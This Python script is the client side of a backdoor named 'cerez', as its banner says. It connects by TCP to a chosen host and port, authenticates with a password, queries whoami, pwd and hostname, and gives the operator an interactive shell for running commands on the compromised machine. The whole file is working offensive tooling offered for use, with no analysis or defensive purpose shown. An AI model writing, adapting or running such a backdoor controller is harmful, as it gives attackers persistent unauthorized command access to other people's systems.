#!/usr/bin/python3
from colorama import Fore, Style, init
from getpass import getpass
from time import sleep
import readline
import socket
import sys
init(autoreset=True)

RED = Fore.RED+Style.BRIGHT
GREEN = Fore.GREEN+Style.BRIGHT
BLUE = Fore.BLUE+Style.BRIGHT
RST = Fore.RESET
RSTALL = Style.NORMAL+Fore.RESET

def b2s(byte):
	return str(byte).replace("b'", "")[:-1].replace("\\n", "\n")

def error(msg):
	print(f"{RED}[-]{RST} {msg}")
	exit()

def success(msg):
	print(f"{GREEN}[+]{RST} {msg}")

def info(msg):
	print(f"{BLUE}[*]{RST} {msg}")

def connect(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((ip, int(port)))
	except:
		error("Connection failed")	
	
	success("Connection successful")
	try:
		pw = getpass(f"{BLUE}[>]{RST} Enter password: ")
	except:
		s.close()
		exit()
	s.send(bytes(pw, "utf-8"))
	res = s.recv(1024)
	
	if res == b"0":
		s.close()
		error("Incorrect password, connection closed")
	
	sleep(1)	

	s.send(b"hostname")
	hostname = b2s(s.recv(1024)).replace("\n", "")
	
	success("Password accepted, created a shell connection")
	cmd = ""
	while cmd!="exit":
		s.send(b"whoami")
		user = b2s(s.recv(1024)).replace("\n", "")

		s.send(b"pwd")
		pwd = b2s(s.recv(1024)).replace("\n", "")
	
		try:
			# user@hostname:pwd# 
			cmd = input(
				f"{RED}{user}{RST}@{RED}{hostname}{RST}:{RED}{pwd}{RSTALL}# "
			)
		except KeyboardInterrupt:
			print()
			continue	

		if cmd=="":
			continue

		try:
			s.send(bytes(cmd, "utf-8"))
		except BrokenPipeError:
			error("Connection got closed by the remote host")
		
		out = s.recv(1024)
		if out == b"" or out == b"NONE":
			continue
		print()
		print(b2s(out))

	s.send(b"exit")
	s.close()
	success("Closed the connection")

if __name__ == "__main__":
	if len(sys.argv) < 2 or len(sys.argv) > 3:
		error(f"{sys.argv[0]} <ip> <port>")
		exit()

	if len(sys.argv) == 2:
		IP = sys.argv[1]
		PORT = 6767
	else:
		IP = sys.argv[1]
		PORT = sys.argv[2]

	print(RED+"""
 ▄████▄  ▓█████  ██▀███  ▓█████ ▒███████▒
▒██▀ ▀█  ▓█   ▀ ▓██ ▒ ██▒▓█   ▀ ▒ ▒ ▒ ▄▀░
▒▓█    ▄ ▒███   ▓██ ░▄█ ▒▒███   ░ ▒ ▄▀▒░ 
▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▀▀█▄  ▒▓█  ▄   ▄▀▒   ░
▒ ▓███▀ ░░▒████▒░██▓ ▒██▒░▒████▒▒███████▒
░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░░░ ▒░ ░░▒▒ ▓░▒░▒
  ░  ▒    ░ ░  ░  ░▒ ░ ▒░ ░ ░  ░░░▒ ▒ ░ ▒
░           ░     ░░   ░    ░   ░ ░ ░ ░ ░
░ ░         ░  ░   ░        ░  ░  ░ ░ 
				
            backdoor client
         github.com/ngn13/cerez
"""+RST)
	info(f"Attempting to connect {IP} on {PORT}")
	connect(IP, PORT)
